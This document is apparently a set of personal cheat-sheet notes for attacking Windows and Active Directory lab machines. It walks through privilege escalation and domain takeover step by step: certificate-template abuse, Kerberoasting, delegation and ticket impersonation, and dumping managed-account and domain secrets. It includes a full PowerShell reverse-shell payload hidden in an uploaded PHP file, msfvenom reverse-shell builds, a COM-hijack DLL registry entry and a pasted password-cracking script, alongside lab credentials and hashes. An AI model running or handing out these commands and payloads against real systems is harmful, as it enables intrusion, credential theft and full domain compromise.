## This is for the windows targets:
Ports to pay attention:
445 SMB
389 LDAP
1433 MSSQL


https://github.com/ly4k/Certipy/wiki

# sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.                                                                                     
└─#  sudo systemctl stop systemd-timesyncd
└─# sudo ntpdate -s 10.10.11.78

normally you will get some creds for win machines.
You should try them to find what they are for


**enumeration:**

for old windows services try some default creds like admin:admin!

 nmap -p- --min-rate 10000 ip

gobuster dir -u "http://name.htb" -w /usr/share/wordlists/seclists/Discovery/Web-Content/dire....txt -t 100 -x php (windows usually use php files)


1) netexec ldap <targetIP> -u <username> -p <password>
and you will get smb and ldap confirmation

2) nxc smb <TargetIP> -u '<username>' -p '<password>' --shares
and you getw all the smb shares

3) crackmapexec smb <targetIP> -u <username> -p <password> --users or --computers

and now you get the info you wanted:

1) smbclient -L //targetip -U <username>
and then
2) smbclient //targetip -U <username>
ls
and you get the files
3)

Then use bloodhund to find the connections and then use impacet tools.

---------------------------------------------------------------------------------------------------------
## Prevelage escalation

you are in as user at this point

1. if its AD check for deleted files: Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
   
2. Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf      (restore the cert_admin)
   
3. Enable-ADAccount -Identity cert_admin

4. Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force)

   so you enabled and reset the password for thus admin cert.
 next steps: Find vulnerable templates,
Request certificate with admin UPN,
Authenticate using certificate,
Change administrator password,
WinRM to gain root access,

5. certipy-ad find -u cert_admin@domain.htb -p 'P@ssword123!' -dc-ip ip -vulnerable         (at your machine)

6. certipy-ad req -dc-ip ip -ca 'domain-CA-1' -target-ip ip -u cert_admin@domain.htb -p 'P@ssword123!' -template WebServer -upn administrator@domain.htb -application-policies 'Client Authentication'

7. certipy-ad auth -pfx administrator.pfx -dc-ip ip -domain domain.htb -ldap-shell

8. > help
   or just:
   > change_password administrator Password@123

and then just evil-winrm it





---------------------------------------------------------------------------------------------------------
1. crackmapexec smb xx.xx.xx.xx -u levi.james -p 'KingofAkron2025!' --users                          (the creds are given)
2. nxc smb PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser" | awk -F '\\' '{print
$2}' | awk '{print $1}' > users.txt                                                      (just creates a .txt with all users)

3. use bloodhound to see all the connections
4. if your user has "GenericWrite" at someone else you can change his password
5. crackmapexec smb xx.xx.xx.xx -u levi.james -p 'KingofAkron2025!' --shares
6. smbclient \\\\xx.xx.xx.xx\\DEV -U "levi.james"
7. try dir and get filename

bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip <ip> set password adam.silver 'abc@123'

save into modify.ldif

dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 512

ldapmodify -x -H ldap://10.10.11.70 -D "ant.edwards@puppy.htb" -w 'Antman2025!' -f modify.ldif

evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'abc@123'


----------------------------------------------------------------------------------------------------------------------
**Bloodhound is a must!** with creds

1. bloodhound-python -u name -p password -d domain.htb -ns ip -c all --zip
2. 
The next part is different everytime

4. If you have **WriteSPN**:
   
    you need this: https://github.com/ShutdownRepo/targetedKerberoast (git clone it)
   
   a. ntpdate -u IP
   
   b. faketime "2025-06-09 16:22:00" python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --dc-ip 10.10.11.72
   
   c. hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

  if you ge $krb5tgs$ hashes do this:
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt


   
   
  If you have **AddSelf**:
  
   a. nano randomname.ldif
   
     dn: CN=<thetargetname>,CN=Users,DC=<domain>,DC=htb
     changetype: modify
     add: member
     member: CN=<targetuser>,CN=Users,DC=<domain>,DC=htb
     
   b. ldapmodify -x -D "domain\targetusername" -w <password> -H ldap://ip -f randomname.ldif
 
  If you have **ReadGMSAPassword**:
  
   a. git clone : https://github.com/micahvandeusen/gMSADumper
   
   b. python3 gMSADumper.py -u name -p password -l ip -d domain.htb
   
   and you will get a hash but you cant crack it yet.
   
  If you have **ForcechangePassword**:
  
   a. bloodyAD -u 'userfrombefore$' -p ':1c37d00093dc2acf25a7z7f2d471fake4afdcthehashfrombefore' -d domain.htb --dc-ip ip set password sanm 'Password123!'
   
  If you have **WriteOwner**:
  
   a. impacket-owneredit -action write -new-owner 'sam' -target 'john' 'domain/sam:Password123!' -dc-ip ip
   
   b. impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target-dn "CN=john,CN=Users,DC=domainname,DC=htb" 'domainname.htb/sam:Password123!' -dc-ip ip
   
   c. bloodyAD -d domainanme.htb -u 'sam' -p 'Password123!' --dc-ip ip set password john 'NewPa$$word'
   
   d. evil-winrm -i ip -u john -p 'NewPa$$word'


----------------------------------------------------------------------------------------------------------------------
1. sudo rdate -n 10.10.11.69  (windows machinesusually need to have the same time as target)
if this doesnt stay try: faketime

2. sudo responder -I tun0 -v
and
smbclient //targetip/IT -U <name>%<password> -c "put <filename>"    to upload a file at smb with write prev

ntpdate -u "ip"

faketime '2025-05-27 20:41:00' certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc

export KRB5CCNAME=ca_svc.ccache

 faketime '2025-05-27 20:43:00' certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -user 'ca_svc' read

faketime '2025-05-27 20:43:00' certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update

faketime '2025-05-27 20:44:00' certipy-ad req  -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'

faketime '2025-05-27 20:45:00' certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update


faketime '2025-05-27 20:46:00' certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'domain.htb' -dc-ip targetIP

evil-winrm -i targetIP -u administrator -H 'hash' 

-------------------------------------------------------------------------------------------------------------------------------------------------------
##(NO CREDS WINDOWS MACHINE)
1. you need good enumeration + create an account at the website:
   gobuster dir ....... +x php   (windows site usually have .php files)
   ffuf ...... 
2. add---> echo '10.10.11.xx name.htb DC01.name.htb' | sudo tee -a /etc/hosts
3. if you found something like ..../upload.php?s_id=1
   try fuzzing it with ffuf or burpsuite
find the right id and there you will find a website that you can upload zip file

4. ZipSlip  (it allows attackers upload a zip file which has a legit file.pdf adn then your malware)
a) echo "hi" > legit.pdf
b) zip legit.zip legit.pdf
c) nano shell.php and put inside this:
  <?php
shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('YOURIP',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");
?>

and do: zip mal.zip shell.php
and: cat legit.zip mal.zip > combined.zip
and upload this zip

d) nc -lvnp 4444
e) then go where this file has saved, meybe: ..../uploads/shell.php

5. now you have a rce as xamppuser. Try to find usefull files like databases and hashes.
use type filename
6. if you find hashes try:
hashcat -a 0 -m hashid -w /usr/share/wordlists/rockyou.txt
7. and log in with evilrm to thuis account and then use bloodhound to find the connections
8. usually you will be able to change a password with:
net rpc password "targetname" "newP@ssword2022" -U "domainanme.htb"/"yourusername"%"thecodeyoufoundfromhash" -S domainanmeagain.htb        (all this on your machine)

9. and this user will have soem rights. you can check with bloodhound and then try to login with evilrm and try:
whoami /priv

if you found seManageVolumePrivilege: then you have the rights to manage The file system like C.
it has the exploit: https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
you dowenload this .exe file at your pc
and then you evilrm at the user fro mthis directory and press: upload .....exe

10. now you run it there: .\SeManageVolumeExploit.exe

and this user now has full control over C
Your target is the Certification authorities CA
11. certutil -exportPFX my "domainanme-LTD-CA" C:\Users\Public\ca.pfx
12. go at the download file at \Public ---> cd Public

13. download ca.pfx    ( PFX IS THE TYPE THAT CA ARA STORED)
14. then at your pc forge a fake administrator.pfx:
   certipy-ad forge -ca-pfx ca.pfx -upn 'administrator@domainanme.htb' -subject 'CN=Administrator,CN=Users,DC=domainanme,DC=htb' -out forged_admin.pfx

15. and now abuse ceripy to auth this ca with kerberos tgt:
certipy-ad auth 0pfx forged_admin.pfx -dc-ip 10.10.11.x -username 'administrator' -domain 'domainanme.htb'

16. You are ready to connect with evil-winrm:
evil-winrm -i 10.10.11.x -u administrator -H'd803303515bf814ac14c5f1702abh866....'
--------------------------------------------------------------------------------------------------------

You have creds!

add etc/hosts with dc. and with nothing

configure your /etc/krb5.conf file to be like this:

[libdefaults]
 default_realm = RUSTYKEY.HTB
 kdc_timesync = 1
 ccache_type = 4
 forwardable = true
 proxiable = true
 fcc-mit-ticketflags = true
 dns_canonicalize_hostname = false
 dns_lookup_realm = false
 dns_lookup_kdc = true
 k5login_authoritative = false
[realms]
 RUSTYKEY.HTB = {
 kdc = rustykey.htb
 admin_server = rustykey.htb
 default_admin = rustykey.htb
 }
[domain_realm]
 .rustykey.htb = RUSTYKEY.HTB


and now user enumeration:

 1. ldapsearch -x -H ldap://10.10.xx.xx -D '<username>@rustykey.htb' -w 'passowrd' -b 'dc=<name>,dc=htb' "(objectClass=user)" userPrincipalName

2. Then bloodhound enumeration with the script i have

3. Then use https://github.com/SecuraBV/Timeroast

Timeroasting takes advantage of Windows' NTP
authentication mechanism, allowing unauthenticated attackers to effectively request a password hash of any
computer or trust account by sending an NTP request with
that account's RID. This is not a problem when computer
accounts are properly generated, but if a non-standard or
legacy default password is set this tool allows you to bruteforce those offline.


edit to be like this:

#!/usr/bin/env python3
"""Perform a simple dictionary attack against the output of timeroast.py. Necessary because
the NTP 'hash' format
unfortunately does not fit into Hashcat or John right now.
Not even remotely optimized, but still useful for cracking legacy default passwords (where
the password is the computer
name) or specific default passwords that are popular in an organisation.
"""
from binascii import hexlify, unhexlify
from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
from typing import TextIO, Generator, Tuple
import hashlib, sys, re
HASH_FORMAT = r'^(?P<rid>\d+):\$sntp-ms\$(?P<hashval>[0-9a-f]{32})\$(?P<salt>[0-9a-f]{96})$'
def md4(data: bytes) -> bytes:
try:
return hashlib.new('md4'
, data).digest()
except ValueError:
from md4 import MD4 # Fallback to pure Python if OpenSSL has no MD4
return MD4(data).bytes()
def compute_hash(password: str, salt: bytes) -> bytes:
"""Compute a legacy NTP authenticator 'hash'
.
"""
return hashlib.md5(md4(password.encode('utf-16le')) + salt).digest()
def try_crack(hashfile: TextIO, dictfile: TextIO) -> Generator[Tuple[int, str], None, None]:
hashes = []
for line in hashfile:
line = line.strip()
if line:
m = re.match(HASH_FORMAT, line)
if not m:
print(f'ERROR: invalid hash format: {line}'
, file=sys.stderr)
sys.exit(1)
rid, hashval, salt = m.group('rid'
,
'hashval'
,
'salt')
hashes.append((int(rid), unhexlify(hashval), unhexlify(salt)))
for password in dictfile:
password = password.strip()
for rid, hashval, salt in hashes:
if compute_hash(password, salt) == hashval:
yield rid, password
def main():
argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
"""Perform a simple dictionary attack against the output of timeroast.py.
Not even remotely optimized, but still useful for cracking legacy default
passwords (where the password is the computer name) or specific default
passwords that are popular in an organisation.
""")
argparser.add_argument('hashes'
, type=FileType('r'), help='Output of timeroast.py')
argparser.add_argument('dictionary'
, type=lambda f: open(f, encoding='latin-1'),
help='Line-delimited password dictionary (e.g. rockyou.txt)')
args = argparser.parse_args()
crackcount = 0
for rid, password in try_crack(args.hashes, args.dictionary):
print(f'[+] Cracked RID {rid} password: {password}')
crackcount += 1
print(f'\n{crackcount} passwords recovered.
')
if __name__ == '__main__':
main()


4. python3 timeroast.py 10.10.11.75 -o <name>.hashes

   python3 timecrack.py rustykey.hashes2 /usr/share/wordlists/rockyou.txt


6. OR use this: nxc smb 10.10.11.75 -M timeroast

--------------------------------------------------------------------------------------
usefull tools:

you loged in with evil-rmn and now upload RunasCs.exe
then :
.\RunasCs.exe  svc_ldap (the username you want to be) M1XyC9pW7qT5Vn (his pass) cmd.exe -r 10.10.16.xx:4444
and in new terminal open : nc -lvnp 4444

powershell

Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID,
objectSid, lastKnownParent | Format-ListGet-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects

Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'

net user /domain
-------------------------------------------------------------------------------------

accesschk.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.x LPORT=4444 -f dll -o rev.dll

msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp;
set LHOST 10.10.16.x; set LPORT 4444; exploit"

upload rev.dll

reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32"
/ve /d "C:\Tools\rev.dll" /f

faketime.... impacket-getST -spn 'cifs/DC.<name>.htb' -impersonate backupadmin -dc-ip 10.10.11.XX -k
'<NAME>.HTB/IT-COMPUTER3$:<password>'

We export the received ticket as a Kerberos cache

export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache

We run wmiexec.py to get a shell as NT/SYTEM

impacket-wmiexec -k -no-pass '<NAME>.HTB/backupadmin@dc.<name>.htb'

We retrieve the root.txt flag

-----------------------------------------------------------
if you found some keys and sid keys:

impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14

and then:
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83



type C:\Users\Administrator\Desktop\root.txt




-----------------------------------------------------------------------------------------
PRIV ESCA:

10. In evil, search for auto-login system with the next 4 fields:
 Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon

If those are legit and the AutoAdminLogon = 1  then you will get the plaintext password from DefaultPassowrd:
DefaultUserName DefaultDomainName DefaultPassword AutoAdminLogon
--------------- ----------------- --------------- --------------
mar...nd      MI..E            1da....ime      1


12. set this as owned in bloodhound, so you see more connections now.

 
13. You can change his password since you have your tgt ticket 
 bloodyAD --kerberos -u "mar....ond" -p "1d....ime" -d "mir....htb" --host "dc01.mira...htb" set password "javier...all" 'Newp@ssw0rd'
 
If thiss fails then:

14. at evil-winrm:
Create a powershell credencial object with mar...nd user. With him you enable-ADAccount for user javi....ll.
Thats why, javi...ll was disabled. And now is enabled from an legit user.
Then you need to extract the LogonHours from mar...nd, which defines for how many hours he can login. (24/7)
And we put them to jav...ll too.


$Password = ConvertTo-SecureString "1da...ime" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ("MI...GE\mar...nd", $Password)
Enable-ADAccount -Identity javi....shall -Cred $Cred
 
$logonhours = Get-ADUser mar....ond -Properties LogonHours | select-object -expand logonhours
[byte[]]$hours1 = $logonhours
Set-ADUser -Identity javi....shall -Cred $Cred -Replace @{logonhours = $hours1}



15. Then we ca nchange his password too
 bloodyAD --kerberos -u "mar....ond" -p "1da....ime" -d "mir....htb" --host "dc01.mir...htb" set password "javie....rshall" 'Newp@ssw0rd'
[+] Password changed successfully!

16. Take a ticket for hime too and export it
 impacket-getTGT MIRAGE.HTB/javier.mmarshall:'Newp@ssw0rd' -dc-ip 10.10.11.78

[*] Saving ticket in javier.mmarshall.ccache
exprot it 
klist

17. Then try to find the keys for encryption-decryption from GMSA-->Group Managed Service Accounts
git clone https://github.com/micahvandeusen/gMSADumper
cd 
python3 gMSADumper.py -k -d mir....htb -l dc01.mira....htb
Users or groups who can read password for Mirag...vice$:
 > javie....rshall
Mirag....vice$:::305806d84f7c........0f0c7866
Mirag....vice$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9........cb9987705e462d9491c0482ae
Mirag....vice$:aes128-cts-hmac-sha1-96:ff1d75e3a880.......b8e3ff17dd

18. Put jav... as owned in bloodhound and study the new connections

19. Now you can take a ticket for Mir...service$
 impacket-getTGT mir....htb/Mira...rvice\$ -aesKey 80bada65a4f84fb900....462d9491c0482ae -dc-ip 10.10.XX.XX

export it
klist




(You dont need to change manually the ccache every time, before you commands put something like: 
KRB5CCNAME=Mirage-Service$.ccache   certipy......)


20. now you need to change the attributes of mark... to has some more preveleges in a new template!
(export Mira...erv$ ticket and then:)
certipy-ad account -u 'Mira...rvice$' -k -target dc01.mira...htb -upn 'dc01$@mira....htb' -user 'mar...ond' update
....
....
[*] Updating user 'mar...bond':
    userPrincipalName                   : dc01$@mira....htb
[*] Successfully updated 'mark...bond'



21. Then with mark...nd's ticket this time (export it) request a new user template. He now has a certificate X.509 that he ca nuse to authenticate himself. 
 certipy-ad req -k -target dc01.mir...htb -ca 'mir...e-DC01-CA' -tamplate 'User' -dc-ip 10.10.XX.XX

                                                    
22. again updates the mark.. and adds to him the UPN=.... for UPN mapping to his certificate. (User Principal Name, its the email address of a user, like mark@10.10.XX.XX)
 certipy-ad account -u 'Mirag...rvice$' -k -target dc01.mira...htb -upn 'mark....nd@mir...htb' -user 'ma...bond' update -dc-ip 10.10.XX.XX

[*] Successfully updated 'mar...d'
                                                                                                             


23. You now get full access in AD through LDAP after you used the certificate .pfx for authentication
certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell

[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mira...htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.xx.xx:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIR...E\\DC01$'
Type help for list of commands

# whoami
u:MI...E\DC01$

24. In this ldap shell (dc01$), you need to give RBCD privelages to Mir...vice$
RBCD=Resource-Based Constrained Delegation
So the Mira...vice$ will be able to impersonate (adiprosopevei??) all the users to the dco1$ threw S4U2Proxy.

# set_rbcd dc01$ Mirage-Service$
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
Mirage-Service$ can now impersonate users on dc01$ via S4U2Proxy

# Bye!


25. Now you need to do the impersonation attack with th getST script, which creates Service Tickets for the name of user (dc01$), using the account from someone that can impersonate(mir..serv)
So, -spn --> you ask for ticket access from CIFS service from dc01
You impersonate that you are dc01$   (the computer account of DC)
'mir..htb/Mira..vice$' --> the account Service Account where you login with the ticket
and at the end is the NTLM hash from mira...vice$


 impacket-getST -spn 'CIFS/dc01.mira...htb' -impersonate 'dc01$' -dc-ip 10.10.xx.xx 'mira...htb/Mira...rvice$' -hashes :305806d84.....0f0c7866
and export the ticket for dc01@CIFS_dc01.mir..htb@MIR..HTB.ccache
export KRB5CCNAME=dc01\$@CIFS_dc01.mira...htb@MIRA....HTB.ccache


26.
impacket-secretsdump -k -no-pass dc01.mirage.htb

getting all the pass hashes!


27. Use the administrators aes256 hash to get a kerb ticket:
 impacket-getTGT mir....htb/Administrator -aesKey 09454bbc6da252ac9......8da5406ad0bce4bdca7

export it
klist

28. evil-winrm -i dc01.mira...htb -r mir....htb 
you in:)

----------------------------------------------------------------------------------------------------------------------
old windows priv esca:

1. you got a shell like evil-winrm, then you build a meterpreter to upload it with msfconsole:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=4444 -f exe > shell.exe

2. then do:
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 4444
run

3. and you have a meterpreter session. Now upload the shell:
upload shell.exe C:\Users\tony\music\shell.exe                 (you need to have connection sstarting fro mthe same directory you have the shell.exe)

4. execute it
./shell.exe

5. and you got it.
meterpreter > getuid
DRIVER\tony

6. if you press "ps" yo uwil see all the e processes that are currently running on the system we can see that we are on session
0 , meaning that the meterpreter process is running on a non-interactive isolated services session.
So you need to migrate it with a process with session 1 id.

migrate <id>

7. then use the exploit suggester to find the right payload for the session 1 machine:
ctl+z
y
use multi/recon/local_exploit_suggester
set session 1
run

8. you find out some more details about the machine like drivers name and staff so you know what to use:
use exploit/windows/local/ricoh_driver_privesc
set payload windows/x64/meterpreter/reverse_tcp
set session 1
set lhost tun0
run

9. 
getuid
cd C:\










